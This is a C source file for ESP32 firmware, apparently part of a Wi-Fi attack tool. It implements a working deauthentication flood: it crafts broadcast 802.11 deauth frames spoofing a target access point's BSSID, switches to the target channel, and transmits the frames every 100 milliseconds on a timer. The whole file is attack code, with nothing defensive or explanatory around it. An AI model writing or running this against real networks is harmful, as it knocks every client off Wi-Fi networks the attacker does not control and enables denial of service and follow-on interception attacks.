#include "attack_method.h"
#include "esp_timer.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include <string.h>
#include "sniffer.h"

static const char *TAG = "attack_method";
static esp_timer_handle_t deauth_timer;
static uint8_t target_bssid[6];
static uint8_t target_channel;

static void send_deauth_frame(void *arg) {
    wifi_promiscuous_pkt_type_t pkt_type = WIFI_PKT_MGMT;
    uint8_t deauth_frame[26] = {
        0xC0, 0x00,                         // Type: Deauth
        0x00, 0x00,                         // Duration
        // Destination (broadcast)
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        // Source (AP)
        0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD,
        // BSSID (AP MAC)
        0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD,
        0x00, 0x00,                         // Seq
        0x07, 0x00                          // Reason code: Class 3 frame received from nonassociated STA
    };

    memcpy(&deauth_frame[10], target_bssid, 6);  // source
    memcpy(&deauth_frame[16], target_bssid, 6);  // BSSID

    wifi_sniffer_send_packet(deauth_frame, sizeof(deauth_frame));
}

void start_deauth_attack(uint8_t bssid[6], uint8_t channel) {
    memcpy(target_bssid, bssid, 6);
    target_channel = channel;

    sniffer_set_channel(target_channel);

    esp_timer_create_args_t timer_args = {
        .callback = &send_deauth_frame,
        .arg = NULL,
        .dispatch_method = ESP_TIMER_TASK,
        .name = "deauth_timer"
    };

    ESP_ERROR_CHECK(esp_timer_create(&timer_args, &deauth_timer));
    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer, 100000)); // 100ms
    ESP_LOGI(TAG, "Deauth attack started on channel %d", target_channel);
}
